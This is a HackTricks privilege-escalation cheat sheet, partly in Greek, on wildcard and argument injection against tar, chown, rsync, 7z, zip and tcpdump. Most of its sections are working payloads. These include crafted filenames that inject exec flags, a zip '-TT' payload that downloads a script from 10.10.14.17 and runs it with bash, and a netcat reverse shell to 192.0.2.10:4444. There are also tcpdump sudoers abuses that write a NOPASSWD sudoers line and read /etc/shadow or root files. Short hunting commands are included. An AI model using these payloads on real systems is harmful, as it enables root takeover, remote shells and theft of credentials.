# Wildcards Spare Tricks

{{#include ../../banners/hacktricks-training.md}}

> Το Wildcard (aka *glob*) **argument injection** συμβαίνει όταν ένα privileged script εκτελεί ένα Unix binary όπως `tar`, `chown`, `rsync`, `zip`, `7z`, … με ένα unquoted wildcard όπως `*`.
> Επειδή το shell επεκτείνει το wildcard **πριν** εκτελέσει το binary, ένας attacker που μπορεί να δημιουργήσει files στον working directory μπορεί να φτιάξει filenames που αρχίζουν με `-` ώστε να ερμηνευτούν ως **options αντί για data**, μεταφέροντας effectively arbitrary flags ή ακόμη και commands.
> Αυτή η page συλλέγει τα πιο χρήσιμα primitives, recent research και modern detections για 2023-2025.

## chown / chmod

Μπορείς να **αντιγράψεις το owner/group ή τα permission bits ενός arbitrary file** καταχρώμενος το flag `--reference`:
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
Όταν το root αργότερα εκτελεί κάτι σαν:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file` εισάγεται, προκαλώντας να κληρονομήσουν *όλα* τα matching files την ιδιοκτησία/permissions του `/root/secret``file`.

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (combined attack).
See also the classic DefenseCode paper for details.

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

Εκτελέστε arbitrary commands εκμεταλλευόμενοι το **checkpoint** feature:
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Μόλις το root εκτελέσει π.χ. `tar -czf /root/backup.tgz *`, το `shell.sh` εκτελείται ως root.

### bsdtar / macOS 14+

Το default `tar` σε πρόσφατο macOS (βασισμένο στο `libarchive`) δεν υλοποιεί το `--checkpoint`, αλλά μπορείς ακόμα να πετύχεις code-execution με το flag **--use-compress-program** που σου επιτρέπει να ορίσεις έναν εξωτερικό compressor.
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
Όταν ένα privileged script εκτελεί `tar -cf backup.tar *`, θα ξεκινήσει το `/bin/sh`.

---

## rsync

Το `rsync` επιτρέπει να παρακάμψεις το remote shell ή ακόμα και το remote binary μέσω command-line flags που ξεκινούν με `-e` ή `--rsync-path`:
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
Αν αργότερα ο root αρχειοθετήσει τον κατάλογο με `rsync -az * backup:/srv/`, η injected flag κάνει το shell σου να εκκινήσει στο απομακρυσμένο σύστημα.

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mode).

---

## 7-Zip / 7z / 7za

Ακόμα κι όταν το privileged script βάζει *αμυντικά* πρόθεμα `--` στο wildcard (για να σταματήσει το option parsing), το format του 7-Zip υποστηρίζει **file list files** με πρόθεμα `@` στο όνομα του αρχείου.  Ο συνδυασμός αυτού με ένα symlink σου επιτρέπει να *exfiltrate arbitrary files*:
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
Αν ο root εκτελέσει κάτι σαν:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip θα προσπαθήσει να διαβάσει το `root.txt` (→ `/etc/shadow`) ως file list και θα αποτύχει, **εκτυπώνοντας τα περιεχόμενα στο stderr**.

Αυτό επιβιώνει του `-- *` επειδή το 7-Zip CLI δέχεται ρητά και κανονικά filenames και `@listfiles` ως positional inputs, οπότε ένα literal filename όπως `@root.txt` εξακολουθεί να αντιμετωπίζεται ειδικά.

---

## zip

Δύο πολύ πρακτικά primitives υπάρχουν όταν μια εφαρμογή περνά user-controlled filenames στο `zip` (είτε μέσω wildcard είτε κάνοντας enumerate names χωρίς `--`).

- RCE μέσω test hook: το `-T` ενεργοποιεί το “test archive” και το `-TT <cmd>` αντικαθιστά τον tester με ένα arbitrary πρόγραμμα (long form: `--unzip-command <cmd>`). Αν μπορείς να κάνεις inject filenames που αρχίζουν με `-`, χώρισε τα flags σε ξεχωριστά filenames ώστε να λειτουργεί το short-options parsing:
```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```
Σημειώσεις
- ΜΗΝ δοκιμάσεις ένα μόνο filename όπως `'-T -TT <cmd>'` — τα short options γίνεται parse per character και θα αποτύχει. Χρησιμοποίησε ξεχωριστά tokens όπως φαίνεται.
- Αν τα slashes αφαιρούνται από τα filenames από το app, κάνε fetch από ένα bare host/IP (default path `/index.html`) και αποθήκευσε το τοπικά με `-O`, μετά εκτέλεσε.
- Μπορείς να κάνεις debug το parsing με `-sc` (show processed argv) ή `-h2` (more help) για να καταλάβεις πώς καταναλώνονται τα tokens σου.

Παράδειγμα (local behavior on zip 3.0):
```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```
- Data exfil/leak: Αν το web layer επιστρέφει το `zip` stdout/stderr (συνηθισμένο σε naïve wrappers), injected flags όπως `--help` ή failures από λάθος options θα εμφανιστούν στην HTTP response, επιβεβαιώνοντας command-line injection και βοηθώντας το payload tuning.

---

## Additional binaries vulnerable to wildcard injection (2023-2025 quick list)

Τα ακόλουθα commands έχουν γίνει abuse σε σύγχρονα CTFs και πραγματικά περιβάλλοντα. Το payload δημιουργείται πάντα ως *filename* μέσα σε writable directory που αργότερα θα επεξεργαστεί με wildcard:

| Binary | Flag to abuse | Effect |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → arbitrary `@file` | Read file contents |
| `flock` | `-c <cmd>` | Execute command |
| `git`   | `-c core.sshCommand=<cmd>` | Command execution via git over SSH |
| `scp`   | `-S <cmd>` | Spawn arbitrary program instead of ssh |

These primitives είναι λιγότερο συνηθισμένα από τα *tar/rsync/zip* classics αλλά αξίζει να τα ελέγχεις όταν κάνεις hunting.

---

## Hunting vulnerable wrappers and jobs

Recent case studies have shown that wildcard/argv injection is no longer just a **cron + tar** problem. Το ίδιο bug class συνεχίζει να εμφανίζεται σε:

- web features that "download everything as zip/tar" from attacker-controlled upload directories
- vendor/appliance debug shells that expose a **tcpdump** wrapper with attacker-controlled filename/filter fields
- backup or rotation jobs that call `tar`, `rsync`, `7z`, `zip`, `chown`, or `chmod` on writable directories

Useful triage commands:
```bash
# Hunt for interesting binaries fed with globs or positional user data
rg -n --hidden --follow \
'(tar|bsdtar|rsync|zip|7z|7za|chown|chmod|tcpdump).*(\*|\$@|\$\*)' \
/etc /opt /usr/local /srv 2>/dev/null

# Watch real argv during cron/systemd execution
pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'

# Sudoers rules that constrain one argument but still allow extra flags
sudo -l
rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
```
Quick heuristics:

- `-- *` είναι ένα καλό fix για πολλά GNU tools, αλλά **όχι** για `7z`/`7za` επειδή τα `@listfiles` αναλύονται ξεχωριστά.
- Για `zip`, ψάξε για wrappers που απαριθμούν απευθείας filenames ελεγχόμενα από τον user; το short-option splitting (`-T` + `-TT <cmd>`) εξακολουθεί να λειτουργεί ακόμη και χωρίς shell glob.
- Για `tcpdump`, δώσε ιδιαίτερη προσοχή σε wrappers που σου επιτρέπουν να ελέγχεις **output file names**, **rotation settings**, ή arguments **capture-file replay**.

---

## tcpdump rotation hooks (-G/-W/-z): RCE via argv injection in wrappers

Όταν ένα restricted shell ή vendor wrapper χτίζει ένα `tcpdump` command line με concatenation από user-controlled fields (π.χ. ένα parameter "file name") χωρίς strict quoting/validation, μπορείς να περάσεις επιπλέον `tcpdump` flags. Ο συνδυασμός των `-G` (time-based rotation), `-W` (limit number of files), και `-z <cmd>` (post-rotate command) δίνει arbitrary command execution ως ο user που τρέχει το tcpdump (συχνά root σε appliances).

Preconditions:

- Μπορείς να επηρεάσεις το `argv` που περνά στο `tcpdump` (π.χ. μέσω ενός wrapper όπως `/debug/tcpdump --filter=... --file-name=<HERE>`).
- Το wrapper δεν κάνει sanitize spaces ή `-`-prefixed tokens στο file name field.

Classic PoC (εκτελεί ένα reverse shell script από ένα writable path):
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
Details:

- `-G 1 -W 1` αναγκάζει άμεσο rotate μετά το πρώτο matching packet.
- `-z <cmd>` εκτελεί την post-rotate command μία φορά ανά rotation. Πολλά builds εκτελούν `<cmd> <savefile>`. Αν το `<cmd>` είναι ένα script/interpreter, βεβαιώσου ότι ο χειρισμός των arguments ταιριάζει με το payload σου.

No-removable-media variants:

- Αν έχεις οποιοδήποτε άλλο primitive για να γράφεις files (π.χ. ένα ξεχωριστό command wrapper που επιτρέπει output redirection), ρίξε το script σου σε ένα γνωστό path και ενεργοποίησε `-z /bin/sh /path/script.sh` ή `-z /path/script.sh` ανάλογα με τα platform semantics.
- Some vendor wrappers rotate to attacker-controllable locations. Αν μπορείς να επηρεάσεις το rotated path (symlink/directory traversal), μπορείς να κατευθύνεις το `-z` να εκτελέσει content που ελέγχεις πλήρως χωρίς external media.

---

## sudoers: tcpdump with wildcards/additional args → arbitrary write/read and root

Very common sudoers anti-pattern:
```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```
Θέματα
- Το `*` glob και τα permissive patterns περιορίζουν μόνο το πρώτο `-w` argument. Το `tcpdump` δέχεται multiple `-w` options· το τελευταίο κερδίζει.
- Το rule δεν καρφώνει άλλα options, οπότε τα `-Z`, `-r`, `-V`, κ.λπ. επιτρέπονται.

Primitives
- Override το destination path με ένα δεύτερο `-w` (το πρώτο απλώς ικανοποιεί το sudoers):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
-w /dev/shm/out.pcap \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Path traversal μέσα στο πρώτο `-w` για να ξεφύγεις από το περιορισμένο tree:
```bash
sudo tcpdump -c10 \
-w/var/cache/captures/a/../../../../dev/shm/out \
-F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Εξαναγκάστε το ownership του output με `-Z root` (δημιουργεί αρχεία με ιδιοκτησία root οπουδήποτε):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-w /dev/shm/root-owned \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Αυθαίρετο περιεχόμενο να γραφτεί με replaying ενός crafted PCAP μέσω `-r` (π.χ., για να drop ένα sudoers line):

<details>
<summary>Δημιούργησε ένα PCAP που περιέχει το ακριβές ASCII payload και γράψ' το ως root</summary>
```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
</details>

- Αυθαίρετο file read/secret leak με `-V <file>` (ερμηνεύει μια λίστα από savefiles). Τα error diagnostics συχνά εμφανίζουν γραμμές, διαρρέοντας περιεχόμενο:
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
-w /tmp/dummy \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
---

## Αναφορές

- [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [0xdf - HTB Dump: Zip arg injection to RCE + tcpdump sudo misconfig privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [FiberGateway GR241AG - Full Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
- [Elastic - Potential Shell via Wildcard Injection Detected](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)

{{#include ../../banners/hacktricks-training.md}}
